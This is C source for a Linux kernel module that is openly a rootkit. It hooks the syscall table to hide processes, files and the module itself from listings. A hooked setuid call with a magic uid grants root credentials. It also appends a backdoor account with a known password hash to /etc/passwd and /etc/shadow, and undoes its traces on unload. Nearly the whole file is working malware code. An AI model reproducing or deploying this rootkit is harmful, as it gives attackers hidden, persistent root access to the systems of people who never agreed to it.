#include <linux/module.h>      // for all modules
#include <linux/moduleparam.h> 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <linux/file.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <asm/unistd.h>        // for system call constants
#include <asm/current.h>       // process information
#include <asm/page.h>
#include <asm/cacheflush.h>

#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

#define BUFFLEN 32
#define PF_INVISIBLE 0x10000000
#define BACKDOOR_PASSWD "user1:x:12345:0:backdoor:/home:/bin/bash\n"
#define BACKDOOR_SHADOW "user1:$1$5RPVAd$9ybzwB9QcnuOV.SNKQWKX1:16888:0:99999:7:::\n" // password is password

#define PASSWD "/etc/passwd"
#define PASSWD_COPY "/tmp/passwd"
#define SHADOW "/etc/shadow"
#define SHADOW_COPY "/tmp/shadow"
#define MAGIC_NUMBER 12345
#define	SIGSHPROC 62
#define SIGSHMOD 63

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};


unsigned long* GetSysTable(void){
	unsigned long *sys_call_table;
	unsigned long int i = (unsigned long int)sys_close;
	while(i < ULONG_MAX) {
		sys_call_table = (unsigned long *)i;
		if(*(sys_call_table + __NR_close) == (unsigned long)sys_close){
			return sys_call_table;
		}
        i = i + sizeof(void *);
	}
	return (unsigned long*)NULL;
}


int isInvisible(pid_t pid){
	struct task_struct* task;
	if(!pid) return 0;
    struct task_struct* curp = current;
    for_each_process(curp){
        if(curp->pid == pid) break;
    }
	if(!curp) return 0;
	if(curp->flags & PF_INVISIBLE) return 1;
	return 0;
}

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  	struct linux_dirent* d;
	char* name;
	char d_type;
  	int bpos = 0;
	int sneaky_len = 0;
	int* des;
  	int read = original_getdents(fd,dirp,count); 
  	if(read == 0){ 
		printk("end of directory\n");
  		return read;
  	}
  	if(read == -1){
  		printk("getdents failed\n");
  		return read;
  	}

  	while(bpos<read){
  		d = (struct linux_dirent *)((char*)dirp + bpos);
  		name = d->d_name;
  		d_type = *((char*)dirp+bpos+d->d_reclen-1);
		if(isInvisible(simple_strtoul(d->d_name, NULL, 10)) || strstr(name,"secure_process") != NULL){
  			sneaky_len = d->d_reclen;
  			des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len);
  			read -= sneaky_len;
  		} 
  		else{
 			bpos += d->d_reclen; 
  			printk("d->d_reclen = %d, bpos = %d\n",d->d_reclen,bpos); 
  		} 
 	}
  	return read;
  	return original_getdents(fd, dirp, count);
}

static struct list_head* module_head;
static short mhide = 0;

void ShowModule(void){
	list_add(&THIS_MODULE->list, module_head);
	mhide = 0;
}

void HideModule(void){
	module_head = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	mhide = 1;
}

asmlinkage int (*original_kill)(pid_t pid, int sig);
asmlinkage int sneaky_kill(pid_t pid, int sig){
	struct task_struct* curp = current;
	if(sig == SIGSHPROC){ 
		for_each_process(curp){
        	if(curp->pid == pid){
				curp->flags = curp->flags ^ PF_INVISIBLE;
				break;
			}
    	}
		return -ESRCH;
	}
	else if(sig == SIGSHMOD){
		if(mhide) ShowModule();
		else HideModule();
	}
	else{
		return original_kill(pid, sig);
	}
	return 0;
}

/* Setuid syscall hook */
asmlinkage int (*origin_setuid) (uid_t uid);
asmlinkage int secure_setuid(uid_t uid)
{
  if (uid == MAGIC_NUMBER)
    {
      /* Create new cred struct */
      struct cred *new_cred;
      new_cred = prepare_creds();
      /* Set uid of new cred struct to 0 */
      new_cred->uid = GLOBAL_ROOT_UID;
      new_cred->gid = GLOBAL_ROOT_GID;
      new_cred->suid = GLOBAL_ROOT_UID;
      new_cred->sgid = GLOBAL_ROOT_GID;
      new_cred->euid = GLOBAL_ROOT_UID;
      new_cred->egid = GLOBAL_ROOT_GID;
      new_cred->fsuid = GLOBAL_ROOT_UID;
      new_cred->fsgid = GLOBAL_ROOT_GID;
      /* Commit cred to task_struct of process */
      commit_creds(new_cred);
      printk(KERN_WARNING "[!] Changes Complete!");
      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);

    }
  /* Call original setuid syscall */
  return origin_setuid(uid);
}

int cp_passwd(char* path, char* copypath){
  struct file *fin;
  struct file *fout;
  loff_t begin = 0;
  //loff_t end = 0;
  int filesize = 0;
  int ret = 0;
  struct kstat stat;
  mm_segment_t old_fs;
  
  old_fs = get_fs();
  set_fs(get_ds());
  fin = filp_open(path, O_RDWR, 0644);
  set_fs(old_fs);
  if(IS_ERR(fin)){
      printk("Cannot open %s in cp function\n", path);
      return 1;
  }

  fout = filp_open(copypath,O_RDWR|O_CREAT, 0644);
  if(IS_ERR(fout)){
    printk("Cannot open %s in cp function\n", copypath);
    return 1;
  }
  old_fs = get_fs();  
  set_fs(get_ds());
  ret = vfs_stat(path, &stat);
  filesize = stat.size;
  printk("filesize = %d\n", filesize);
  char buf[filesize];
  set_fs(old_fs);
  if(ret < 0){
	  printk("wrong end offset\n");
	  return 1;
  }
  old_fs = get_fs();
  set_fs(get_ds());
  filesize = vfs_read(fin, buf, filesize, &begin);
  set_fs(old_fs);
  printk("filesize = %d\n", filesize);
  if(filesize < 0){
    printk("wrong file size\n");
    return 1;
  }
  //printk("filesize = %d, end = %d\n", filesize, end);
  old_fs = get_fs();
  set_fs(get_ds());
  begin = 0;
  ret = vfs_write(fout, buf, filesize, &begin);
  set_fs(old_fs);
  if(ret < 0){
  	printk("file backup failed\n");
	  return 1;
  }
  return 0;
}

void add_backdoor(char * pathname)
{
  char * BACKDOOR;
  loff_t offset = 0;
  int ret = 0;
  mm_segment_t old_fs;
  struct file *file;
  if(strcmp(pathname, PASSWD)==0){
    BACKDOOR = BACKDOOR_PASSWD;
    cp_passwd(pathname, PASSWD_COPY);
  }
 	if(strcmp(pathname, SHADOW)==0){
    BACKDOOR = BACKDOOR_SHADOW;
    cp_passwd(pathname, SHADOW_COPY);
 	}
 	old_fs = get_fs();
  set_fs(get_ds());
	file = filp_open(pathname, O_RDWR, 0);
  set_fs(old_fs);
  if(IS_ERR(file)){
    printk("file open err\n");
    return;
  }
	set_fs(get_ds());
  offset = vfs_llseek(file, offset, SEEK_END);
  set_fs(old_fs);
	if(offset < 0){
		printk("wrong offset\n");
		return;
	}
  set_fs(get_ds());
	file = filp_open(pathname, O_RDWR, 0);
  set_fs(old_fs);
  if(IS_ERR(file)){
    printk("file open err\n");
    return;
  }
	old_fs = get_fs();
  set_fs(get_ds());
  ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
  set_fs(old_fs);
  if(ret<0){
    printk("backdoor write failed\n");
    return;
  }
}

int restore_passwd(char* copypath, char* path){
  struct file *fin;
  struct file *fout;
  loff_t begin = 0;
  //loff_t end = 0;
  mm_segment_t old_fs;
  int filesize = 0;
  int copyfilesize = 0;
  int ret = 0;
  struct kstat stat;
  struct kstat copystat;

  old_fs = get_fs();
  set_fs(get_ds());
  fin = filp_open(copypath, O_RDWR, 0);
  set_fs(old_fs);
  if(IS_ERR(fin)){
      printk("Cannot open %s in restore function\n", path);
      return 1;
  }

  fout = filp_open(path,O_RDWR, 0);
  if(IS_ERR(fout)){
    printk("Cannot open %s in restore function\n", copypath);
    return 1;
  }

  old_fs = get_fs();  
  set_fs(get_ds());
  ret = vfs_stat(path, &stat);
  ret = vfs_stat(copypath, &copystat);
  filesize = stat.size;
  copyfilesize = copystat.size;
  char buf[filesize]; 
  char copybuf[copyfilesize];
  old_fs = get_fs();
  set_fs(get_ds());
  copyfilesize = vfs_read(fin, copybuf, copyfilesize, &begin);
  begin = 0;
  filesize = vfs_read(fout, buf, filesize, &begin);
  set_fs(old_fs);
  if(copyfilesize < 0){
    printk("wrong file size\n");
    return 1;
  }
  int i = copyfilesize;
  while(i < filesize-1){
    buf[i] = ' ';
    i++;
  }
  buf[filesize-1] = '\n';
  old_fs = get_fs();
  set_fs(get_ds());
  begin = 0;
  ret = vfs_write(fout, buf, filesize, &begin);
  set_fs(old_fs);
  if(ret < 0){
  	printk("file restore failed\n");
	return 1;
  }
  return 0;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being loaded.\n");
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
  add_backdoor(PASSWD);
  add_backdoor(SHADOW);
  module_head = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  mhide = 1;
  unsigned long *sys_call_table = GetSysTable();
  //getdents
  original_getdents = (void*)*(sys_call_table + __NR_getdents);  
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
  //kill
  original_kill = (void*)*(sys_call_table + __NR_kill);  
  *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill;
  //setuid
  origin_setuid = (void*)*(sys_call_table + __NR_setuid);
  *(sys_call_table + __NR_setuid) = (unsigned long)secure_setuid;
  cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
  //restore passwd and shadow file
  restore_passwd(PASSWD_COPY, PASSWD);
  restore_passwd(SHADOW_COPY, SHADOW);

  unsigned long *sys_call_table = GetSysTable();
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
  *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
  cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

